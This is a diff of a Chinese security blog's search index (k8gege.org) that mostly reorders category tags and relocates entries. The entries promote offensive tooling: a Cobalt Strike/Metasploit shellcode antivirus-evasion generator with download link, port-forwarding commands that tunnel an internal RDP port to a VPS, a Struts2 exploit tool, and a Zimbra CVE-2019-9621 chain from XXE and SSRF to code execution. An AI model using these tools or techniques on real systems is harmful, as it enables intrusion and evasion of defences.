@@ -4083,11 +4083,11 @@ WIN-OLDM1T2H9M4                     WIN-OLDM1T2H9M4          </code></pre>
       <categories>
         <category>Ladon</category>
         <category>.NET</category>
-        <category>主机发现</category>
         <category>源码</category>
+        <category>主机发现</category>
         <category>内网渗透</category>
-        <category>信息收集</category>
         <category>编程</category>
+        <category>信息收集</category>
       </categories>
       <tags>
         <tag>Ladon</tag>
@@ -4255,8 +4255,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
       <categories>
         <category>Ladon</category>
         <category>Cobalt Strike</category>
-        <category>远程执行</category>
         <category>内网渗透</category>
+        <category>远程执行</category>
       </categories>
       <tags>
         <tag>Cobalt Strike</tag>
@@ -4620,8 +4620,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 ]]></content>
       <categories>
         <category>Ladon</category>
-        <category>Kali</category>
         <category>密码</category>
+        <category>Kali</category>
       </categories>
       <tags>
         <tag>Ladon</tag>
@@ -5221,8 +5221,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
       </categories>
       <tags>
         <tag>Metasploit</tag>
-        <tag>PowerShell</tag>
         <tag>.NET</tag>
+        <tag>PowerShell</tag>
         <tag>C#</tag>
         <tag>MSF</tag>
         <tag>meterpreter</tag>
@@ -5832,35 +5832,6 @@ Microsoft Windows 10 for 32-bit Systems 0
       </tags>
   </entry>
   <entry>
-    <title>CobaltStrike &amp; Metasploit Shellcode一键免杀工具</title>
-    <url>/p/9cffe32c.html</url>
-    <content><![CDATA[<p><span style="font-size: 18px;"><strong>0x001 前言</strong></span></p>
-<p>CobaltStrike &amp; Metasploit&nbsp; Shellcode一键免杀工具</p>
-<p>加载器通过AES加密ShellCode，动态编译生成EXE。</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/scencode.png"></p>
-<p>1个月前该工具生成的exe免杀所有杀软，现在未测应该还能过90%的杀软吧。</p>
-<p>可选.net版本为系统安装对应版本，1.0仅支持.net EXE生成。</p>
-<p>后续版本不一定公开，望大家见谅，有兴趣的自行反编译生成的exe就知道怎么弄了。</p>
-<p><strong>注意</strong>: <span style="color: #ff00ff;">一定要使用无后门特征的CS,否则上线1分钟就被个别杀软查杀</span>(因为CS默认每分钟发送流量包,里面包含后门特征信息)</p>
-<p><strong>声明</strong>: 程序<span style="color: #ff00ff;">仅免杀shellcode</span>部分,CS加载的<span style="color: #ff00ff;">其它模块不免杀</span>(比如运行mimikaz读取密码被个别杀软查杀)</p>
-<p>CS其它模块免杀，请自行修改CS客户端资源里对应的DLL，比如mimikaz_x86.dll、mimikaz_x64.dll</p>
-<p>&nbsp;</p>
-<p><span style="font-size: 18px; color: #ff00ff;"><strong>0x002 下载</strong> </span></p>
-<p><span style="font-size: 14px;"><a href="https://github.com/k8gege/K8tools/raw/master/K8_SC_ENCODE(CobaltStrike%20%26%20Metasploit%20Shellcode%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7).rar" target="_blank">https://github.com/k8gege/K8tools/raw/master/K8_SC_ENCODE(CobaltStrike &amp; Metasploit Shellcode免杀工具).rar</a></span></p>]]></content>
-      <categories>
-        <category>工具</category>
-        <category>免杀</category>
-        <category>Metasploit</category>
-        <category>Cobalt Strike</category>
-        <category>ShellCode</category>
-      </categories>
-      <tags>
-        <tag>Tool</tag>
-        <tag>Cobalt Strike</tag>
-        <tag>Metasploit</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>K8 Struts2 EXP 综合漏洞利用工具</title>
     <url>/p/ab3e87f7.html</url>
     <content><![CDATA[<p>工具:&nbsp;K8&nbsp;Struts2&nbsp;Exploit<br>组织:&nbsp;K8搞基大队[K8team]<br>作者:&nbsp;K8拉登哥哥<br>博客:&nbsp;<a href="http://qqhack8.blog.163.com" target="_blank">http://qqhack8.blog.163.com</a><br>发布:&nbsp;2014/7/31&nbsp;10:24:56<br><br>简介: <br><br>K8 Struts2 综合漏洞利用工具 (Apache Struts Remote Code Execution Exploit)<br>Struts2漏洞检测工具&nbsp;&nbsp; Struts2漏洞测试工具&nbsp; K8 struts2 exploit Test&nbsp; Struts2 GetShell<br>支持漏洞 (S2-045 devMode S2-032&nbsp; s2-020&nbsp; s2-019&nbsp; s2-016&nbsp; s2-013&nbsp; s2-009 S2-005)&nbsp; <br><br>声明:工具仅供安全检测或网络攻防研究,非法用途后果自负.<br>图片: <br><img alt data-original="http://k8gege.org/k8img/posts/S2exp1.png"></p>
@@ -5905,6 +5876,35 @@ Microsoft Windows 10 for 32-bit Systems 0
         <tag>Tool</tag>
         <tag>Struts2</tag>
         <tag>GetShell</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CobaltStrike &amp; Metasploit Shellcode一键免杀工具</title>
+    <url>/p/9cffe32c.html</url>
+    <content><![CDATA[<p><span style="font-size: 18px;"><strong>0x001 前言</strong></span></p>
+<p>CobaltStrike &amp; Metasploit&nbsp; Shellcode一键免杀工具</p>
+<p>加载器通过AES加密ShellCode，动态编译生成EXE。</p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/scencode.png"></p>
+<p>1个月前该工具生成的exe免杀所有杀软，现在未测应该还能过90%的杀软吧。</p>
+<p>可选.net版本为系统安装对应版本，1.0仅支持.net EXE生成。</p>
+<p>后续版本不一定公开，望大家见谅，有兴趣的自行反编译生成的exe就知道怎么弄了。</p>
+<p><strong>注意</strong>: <span style="color: #ff00ff;">一定要使用无后门特征的CS,否则上线1分钟就被个别杀软查杀</span>(因为CS默认每分钟发送流量包,里面包含后门特征信息)</p>
+<p><strong>声明</strong>: 程序<span style="color: #ff00ff;">仅免杀shellcode</span>部分,CS加载的<span style="color: #ff00ff;">其它模块不免杀</span>(比如运行mimikaz读取密码被个别杀软查杀)</p>
+<p>CS其它模块免杀，请自行修改CS客户端资源里对应的DLL，比如mimikaz_x86.dll、mimikaz_x64.dll</p>
+<p>&nbsp;</p>
+<p><span style="font-size: 18px; color: #ff00ff;"><strong>0x002 下载</strong> </span></p>
+<p><span style="font-size: 14px;"><a href="https://github.com/k8gege/K8tools/raw/master/K8_SC_ENCODE(CobaltStrike%20%26%20Metasploit%20Shellcode%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7).rar" target="_blank">https://github.com/k8gege/K8tools/raw/master/K8_SC_ENCODE(CobaltStrike &amp; Metasploit Shellcode免杀工具).rar</a></span></p>]]></content>
+      <categories>
+        <category>工具</category>
+        <category>Metasploit</category>
+        <category>免杀</category>
+        <category>Cobalt Strike</category>
+        <category>ShellCode</category>
+      </categories>
+      <tags>
+        <tag>Tool</tag>
+        <tag>Cobalt Strike</tag>
+        <tag>Metasploit</tag>
       </tags>
   </entry>
   <entry>
@@ -6000,46 +6000,6 @@ Microsoft Windows 10 for 32-bit Systems 0
         <tag>Ladon</tag>
         <tag>Tool</tag>
         <tag>Python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>.NET端口转发工具PortTran</title>
-    <url>/p/3f55538f.html</url>
-    <content><![CDATA[<p><span style="font-size: 18px;"><strong>0x001 简介</strong></span></p>
-<p>PortTran by k8gege<br>.NET版端口转发工具，支持任意权限下转发 </p>
-<p><span style="font-size: 18px;"><strong>0x002 背景</strong></span><br>工具在2016年左右写的，当时某个内网不知何原故LCX用不了</p>
-<p>由于Win2003才刚停更不久，依然有不少内网还是03的机器</p>
-<p>加上.NET版的兼容性均没LCX好，所以我自己也很少用...</p>
-<p>以至于忘了自己有弄过这玩意，现在基本都WIN7以后系统</p>
-<p>.net程序不用慌了，体积小和易于免杀大家都开心了。</p>
-<p><span style="font-size: 18px;"><strong>0x003 用法</strong></span></p>
-<div class="cnblogs_Highlighter">
-<pre class="brush:python;gutter:true;">0x001 VPS监听
-PortTranS.exe 8000 338
-
-<p>0x002 目标内网转发<br>PortTranC20.exe 192.168.1.103 3389 192.168.1.102 8000</p>
-<p>0x003 VPS连接3389<br>mstsc /console /v:127.0.0.1:338<br></p></pre><p></p>
-</div>
-<p><span style="font-size: 18px;"><strong>&nbsp;0x004 实例 </strong></span></p>
-<p>1.vps监听</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/PortTran1.png"></p>
-<p>2.目标内网3389端口转发</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/PortTran2.png"></p>
-<p>3. 连接VPS的338端口即为被转发内网机器的3389，同理可转发其它端口，使用对应的工具连接就可以了</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/PortTran3.png"></p>
-<p>不要死板，很多人误以为只能用于转发3389，这是因为不理解什么叫端口转发，如果只能转特定端口</p>
-<p>就不会起名叫端口转发了，应该叫3389转发，1433、1521等端口不是端口吗？内网访问不了你都可以转出来</p>
-<p>再使用对应数据库连接工具连接啊，要懂得举一反三，不要死脑筋，只懂用于转发3389。</p>
-<p><span style="font-size: 18px; color: #ff00ff;"><strong>0x005 下载</strong></span></p>
-<p><a href="https://github.com/k8gege/K8tools/raw/master/PortTran.rar" target="_blank">https://github.com/k8gege/PortTran</a></p>
-<p>&nbsp;</p>]]></content>
-      <categories>
-        <category>工具</category>
-        <category>.NET</category>
-      </categories>
-      <tags>
-        <tag>Tool</tag>
-        <tag>PortTran</tag>
       </tags>
   </entry>
   <entry>
@@ -6143,8 +6103,8 @@ ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
 <p>基本都是白名单加载DLL，DLL释放各种加密文件，再解密执行，最终加载CS而已。</p>]]></content>
       <categories>
         <category>工具</category>
-        <category>免杀</category>
         <category>Metasploit</category>
+        <category>免杀</category>
         <category>Cobalt Strike</category>
         <category>ShellCode</category>
         <category>Python</category>
@@ -6181,6 +6141,46 @@ ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
         <tag>Tool</tag>
         <tag>MS17010</tag>
         <tag>SMB</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>.NET端口转发工具PortTran</title>
+    <url>/p/3f55538f.html</url>
+    <content><![CDATA[<p><span style="font-size: 18px;"><strong>0x001 简介</strong></span></p>
+<p>PortTran by k8gege<br>.NET版端口转发工具，支持任意权限下转发 </p>
+<p><span style="font-size: 18px;"><strong>0x002 背景</strong></span><br>工具在2016年左右写的，当时某个内网不知何原故LCX用不了</p>
+<p>由于Win2003才刚停更不久，依然有不少内网还是03的机器</p>
+<p>加上.NET版的兼容性均没LCX好，所以我自己也很少用...</p>
+<p>以至于忘了自己有弄过这玩意，现在基本都WIN7以后系统</p>
+<p>.net程序不用慌了，体积小和易于免杀大家都开心了。</p>
+<p><span style="font-size: 18px;"><strong>0x003 用法</strong></span></p>
+<div class="cnblogs_Highlighter">
+<pre class="brush:python;gutter:true;">0x001 VPS监听
+PortTranS.exe 8000 338
+
+<p>0x002 目标内网转发<br>PortTranC20.exe 192.168.1.103 3389 192.168.1.102 8000</p>
+<p>0x003 VPS连接3389<br>mstsc /console /v:127.0.0.1:338<br></p></pre><p></p>
+</div>
+<p><span style="font-size: 18px;"><strong>&nbsp;0x004 实例 </strong></span></p>
+<p>1.vps监听</p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/PortTran1.png"></p>
+<p>2.目标内网3389端口转发</p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/PortTran2.png"></p>
+<p>3. 连接VPS的338端口即为被转发内网机器的3389，同理可转发其它端口，使用对应的工具连接就可以了</p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/PortTran3.png"></p>
+<p>不要死板，很多人误以为只能用于转发3389，这是因为不理解什么叫端口转发，如果只能转特定端口</p>
+<p>就不会起名叫端口转发了，应该叫3389转发，1433、1521等端口不是端口吗？内网访问不了你都可以转出来</p>
+<p>再使用对应数据库连接工具连接啊，要懂得举一反三，不要死脑筋，只懂用于转发3389。</p>
+<p><span style="font-size: 18px; color: #ff00ff;"><strong>0x005 下载</strong></span></p>
+<p><a href="https://github.com/k8gege/K8tools/raw/master/PortTran.rar" target="_blank">https://github.com/k8gege/PortTran</a></p>
+<p>&nbsp;</p>]]></content>
+      <categories>
+        <category>工具</category>
+        <category>.NET</category>
+      </categories>
+      <tags>
+        <tag>Tool</tag>
+        <tag>PortTran</tag>
       </tags>
   </entry>
   <entry>
@@ -6280,164 +6280,6 @@ payload5='\x23\x64\x61\x74\x65\x3A\x20\x32\x30\x31\x39\x30\x36\x32\x36\x20\x23\x
         <tag>Tool</tag>
         <tag>Code</tag>
         <tag>GetShell</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CVE-2019-9621 Zimbra&lt;8.8.11 GetShell Exploit</title>
-    <url>/p/19452dd9.html</url>
-    <content><![CDATA[<table style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 12px; line-height: 1.5; font-family: 宋体, sans-serif, microsoft yahei, 微软雅黑, tahoma, arial; width: 567px;">
-<tbody style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5;">
-<tr class="firstRow" style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5;">
-<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border: 1px solid #000;" valign="top" width="104">
-<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">发现时间</span></p>
-</td>
-<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: #000 #000 #000 currentcolor; border-style: solid solid solid none; border-width: 1px 1px 1px medium; border-image-source: none; border-image-slice: 100%; border-image-width: 1; border-image-outset: 0; border-image-repeat: stretch;" valign="top" width="463">
-<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px;">2019<span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">年<span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px;">03<span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">月<span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px;">18<span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">日</span></span></span></span></span></span></p>
-</td>
-</tr>
-<tr style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5;">
-<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000; border-style: none solid solid; border-width: medium 1px 1px; border-image-source: none; border-image-slice: 100%; border-image-width: 1; border-image-outset: 0; border-image-repeat: stretch;" valign="top" width="104">
-<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">威胁目标</span></p>
-</td>
-<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000 currentcolor; border-style: none solid solid none; border-width: medium 1px 1px medium;" valign="top" width="463">
-<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">采用<span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px;">Zimbra<span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">邮件系统的企业</span></span></span></p>
-</td>
-</tr>
-<tr style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5;">
-<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000; border-style: none solid solid; border-width: medium 1px 1px; border-image-source: none; border-image-slice: 100%; border-image-width: 1; border-image-outset: 0; border-image-repeat: stretch;" valign="top" width="104">
-<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">主要风险</span></p>
-</td>
-<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000 currentcolor; border-style: none solid solid none; border-width: medium 1px 1px medium;" valign="top" width="463">
-<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">远程代码执行</span></p>
-</td>
-</tr>
-<tr style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5;">
-<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000; border-style: none solid solid; border-width: medium 1px 1px; border-image-source: none; border-image-slice: 100%; border-image-width: 1; border-image-outset: 0; border-image-repeat: stretch;" valign="top" width="104">
-<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">攻击入口</span></p>
-</td>
-<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000 currentcolor; border-style: none solid solid none; border-width: medium 1px 1px medium;" valign="top" width="463">
-<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px;">localconfig.xml &nbsp;<span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">配置文件</span></span></p>
-</td>
-</tr>
-<tr style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5;">
-<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000; border-style: none solid solid; border-width: medium 1px 1px; border-image-source: none; border-image-slice: 100%; border-image-width: 1; border-image-outset: 0; border-image-repeat: stretch;" valign="top" width="104">
-<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">使用漏洞</span></p>
-</td>
-<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000 currentcolor; border-style: none solid solid none; border-width: medium 1px 1px medium;" valign="top" width="463">
-<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px;">CVE-2019-9621</span></p>
-</td>
-</tr>
-<tr style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5; height: 25px;">
-<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000; border-style: none solid solid; border-width: medium 1px 1px; border-image-source: none; border-image-slice: 100%; border-image-width: 1; border-image-outset: 0; border-image-repeat: stretch;" valign="top" width="104">
-<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">受影响应用</span></p>
-</td>
-<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000 currentcolor; border-style: none solid solid none; border-width: medium 1px 1px medium;" valign="top" width="463">
-<p style="padding: 0px 0px 5px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; border: none; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px;">ZimbraCollaboration Server 8.8.11&nbsp;<span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">之前的版本都受到影响。</span></span></p>
-</td>
-</tr>
-<tr style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5;">
-<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000; border-style: none solid solid; border-width: medium 1px 1px; border-image-source: none; border-image-slice: 100%; border-image-width: 1; border-image-outset: 0; border-image-repeat: stretch;" valign="top" width="104">
-<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">已知影响</span></p>
-</td>
-<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000 currentcolor; border-style: none solid solid none; border-width: medium 1px 1px medium;" valign="top" width="463">
-<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">导致服务器信息泄露</span></p>
-</td>
-</tr>
-<tr style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5;">
-<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000; border-style: none solid solid; border-width: medium 1px 1px; border-image-source: none; border-image-slice: 100%; border-image-width: 1; border-image-outset: 0; border-image-repeat: stretch;" valign="top" width="104">
-<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">威胁程度</span></p>
-</td>
-<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000 currentcolor; border-style: none solid solid none; border-width: medium 1px 1px medium;" valign="top" width="463">
-<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">高</span></p>
-</td>
-</tr>
-</tbody>
-</table>
-<p>&nbsp;</p>
-<h3 style="margin: 0px; padding: 0px; font-weight: normal; font-stretch: normal; font-size: 12px; line-height: 1.5; font-family: 宋体, sans-serif, microsoft yahei, 微软雅黑, tahoma, arial;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 19px; line-height: 21.85px; font-family: arial, sans-serif; color: black;"><span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; font-size: 19px; line-height: 21.85px; font-family: 宋体; color: black; letter-spacing: 0px;">漏洞描述：</span></span></h3>
-<p><span style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5; font-family: 宋体; font-size: 15px;"><span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体; letter-spacing: 0px;">当<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; letter-spacing: 0px;">&nbsp;Zimbra&nbsp;<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体; letter-spacing: 0px;">存在像任意文件读取、<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; letter-spacing: 0px;">XXE<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体; letter-spacing: 0px;">（<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; letter-spacing: 0px;">xml<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体; letter-spacing: 0px;">外部实体注入）<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体; letter-spacing: 0px;">这种漏洞时，攻击者可以利用此漏洞读取<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; letter-spacing: 0px;">&nbsp;localconfig.xml<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体; letter-spacing: 0px;">配置文件，获取到<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; letter-spacing: 0px;">&nbsp;zimbra admin ldap password<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体; letter-spacing: 0px;">，并通过<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; letter-spacing: 0px;">&nbsp;7071 admin&nbsp;<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体; letter-spacing: 0px;">端口进行<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; letter-spacing: 0px;">&nbsp;SOAP AuthRequest&nbsp;<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体; letter-spacing: 0px;">认证，得到<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; letter-spacing: 0px;">&nbsp;admin authtoken</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span>漏洞是利用XXE<span style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5; font-family: 宋体;">和ProxyServlet SSRF&nbsp;<span style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5; font-family: 宋体;">漏洞拿到&nbsp;admin authtoken&nbsp;<span style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5; font-family: 宋体;">后，通过文件上传在服务端执行任意代码，威胁程度极高。当Zimbra<span style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5; font-family: 宋体;">服务端打来Memcached<span style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5; font-family: 宋体;">缓存服务是，<span style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5; font-family: 宋体;">可以利用SSRF<span style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5; font-family: 宋体;">攻击进行反序列化执行远程代码。不过由于Zimbra<span style="margin: 0px; padding: 0px; 